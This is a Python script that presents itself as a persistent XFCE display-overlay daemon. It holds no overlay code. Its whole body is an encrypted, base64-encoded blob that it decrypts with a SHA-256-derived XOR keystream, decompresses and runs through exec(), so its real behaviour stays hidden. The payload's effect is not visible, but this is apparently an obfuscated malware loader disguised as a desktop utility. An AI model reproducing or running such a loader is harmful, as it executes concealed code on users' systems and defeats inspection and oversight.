#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Pre-Warmed Persistent Daemon - XFCE Display Overlay v3.0 (Protected)
import base64 as _b, hashlib as _h, zlib as _z

_S = b"f3d0ff0b8851166e57484394"
_D = (
    "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"
)

def _ld():
    raw = _b.b64decode(_D)
    out = bytearray(len(raw))
    idx = 0
    pos = 0
    while pos < len(raw):
        dg = _h.sha256(_S + str(idx).encode()).digest()
        n = min(32, len(raw) - pos)
        for i in range(n):
            out[pos + i] = raw[pos + i] ^ dg[i]
        pos += n
        idx += 1
    return _z.decompress(bytes(out))

exec(compile(_ld(), __file__, "exec"), globals())
